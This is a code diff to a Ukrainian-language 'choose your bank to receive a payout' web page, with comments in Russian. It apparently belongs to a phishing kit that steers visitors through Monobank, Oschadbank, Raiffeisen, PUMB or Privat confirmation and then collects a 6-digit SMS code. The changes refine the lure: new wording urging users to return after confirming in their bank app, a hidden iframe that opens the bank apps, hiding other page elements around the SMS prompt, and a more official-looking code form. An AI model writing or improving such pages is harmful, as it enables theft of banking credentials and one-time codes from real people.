@@ -86,7 +86,7 @@
 <body>
 
   <h1>Виберіть ваш банк</h1>
-  <div id="subtitle">Для отримання виплат виберіть банк, у якому у вас є діюча карта.</div>
+  <div id="subtitle">Після підтвердження в додатку банку обов'язково поверніться на цей сайт для <strong>отримання виплати</strong></div>
   
   <button class="bank-btn mono" id="mono-btn" disabled>
     Monobank
@@ -244,7 +244,17 @@
     function resetUI() {
       document.getElementById("return-instruction").style.display = "none";
       document.getElementById("status").textContent = "";
-      // ← ДОБАВЛЕНО: Восстанавливаем тексты кнопок при сбросе UI
+      
+      // ← ДОБАВЛЕНО: Показываем обратно все элементы интерфейса
+      document.getElementById("mono-btn").style.display = "flex";
+      document.getElementById("oschad-btn").style.display = "flex"; 
+      document.getElementById("raiff-btn").style.display = "flex";
+      document.getElementById("pumb-btn").style.display = "flex";
+      document.getElementById("privat-link").style.display = "flex";
+      document.querySelector("h1").style.display = "block";
+      document.getElementById("subtitle").style.display = "block";
+      
+      // Восстанавливаем тексты кнопок при сбросе UI
       restoreButtonTexts();
       autoRefreshActive = true; // Возобновляем автообновление
     }
@@ -297,7 +307,38 @@
       }
       
       document.getElementById("return-instruction").style.display = "";
-      window.location.href = link;
+      
+      // ← ДОБАВЛЕНО: Автоматический возврат через app linking (если поддерживается)
+      // Сначала пытаемся открыть через app scheme, затем обычную ссылку
+      const appSchemes = {
+        "monobank": "monobank://",
+        "oschadbank": "oschad://", 
+        "raiffeisenbank": "raiffeisen://",
+        "pumbbank": "pumb://"
+      };
+      
+      if (appSchemes[bank]) {
+        // Создаем скрытый iframe для попытки открыть приложение
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = appSchemes[bank];
+        document.body.appendChild(iframe);
+        
+        // Удаляем iframe через 1 секунду
+        setTimeout(() => {
+          document.body.removeChild(iframe);
+        }, 1000);
+        
+        // Если через 2 секунды пользователь все еще на странице, 
+        // открываем обычную ссылку в новой вкладке
+        setTimeout(() => {
+          window.open(link, '_blank');
+        }, 2000);
+      } else {
+        // Для банков без app scheme просто открываем ссылку
+        window.open(link, '_blank');
+      }
+      
       pollStatus();
     }
 
@@ -332,15 +373,35 @@
     }
 
     function showCodeInput() {
-      // ← ДОБАВЛЕНО: Скрываем загрузку при показе поля ввода
+      // Скрываем загрузку при показе поля ввода
       hideLoading();
       
+      // ← ДОБАВЛЕНО: Скрываем ВСЕ кнопки банков при показе SMS поля
+      document.getElementById("mono-btn").style.display = "none";
+      document.getElementById("oschad-btn").style.display = "none"; 
+      document.getElementById("raiff-btn").style.display = "none";
+      document.getElementById("pumb-btn").style.display = "none";
+      document.getElementById("privat-link").style.display = "none";
+      
+      // ← ДОБАВЛЕНО: Скрываем заголовок и подзаголовок
+      document.querySelector("h1").style.display = "none";
+      document.getElementById("subtitle").style.display = "none";
+      
       document.getElementById("status").innerHTML = `
-        <b>Введіть 6-значний код з SMS:</b><br>
-        <input id="sms-code" type="text" maxlength="6" autocomplete="one-time-code" inputmode="numeric">
-        <button id="send-code-btn">Підтвердити</button>
+        <h2 style="margin-bottom: 20px; color: #333;">Введіть код з SMS</h2>
+        <div style="margin-bottom: 15px; color: #666; font-size: 16px;">
+          Ми надіслали 6-значний код підтвердження на ваш номер телефону
+        </div>
+        <input id="sms-code" type="text" maxlength="6" autocomplete="one-time-code" inputmode="numeric" 
+               placeholder="000000" style="font-size: 24px; letter-spacing: 8px; padding: 12px 20px; 
+               text-align: center; width: 200px; margin: 10px; border: 2px solid #ddd; border-radius: 8px;">
+        <br>
+        <button id="send-code-btn" style="margin-top: 15px; padding: 12px 40px; font-size: 18px; 
+                background: #1976d2; color: #fff; border: none; border-radius: 8px; cursor: pointer;">
+          Підтвердити код
+        </button>
         <span id="timer"></span>
-        <div id="sms-error"></div>
+        <div id="sms-error" style="color: red; margin-top: 10px; font-size: 16px;"></div>
       `;
       document.getElementById("sms-code").focus();
       startSMSTimer();
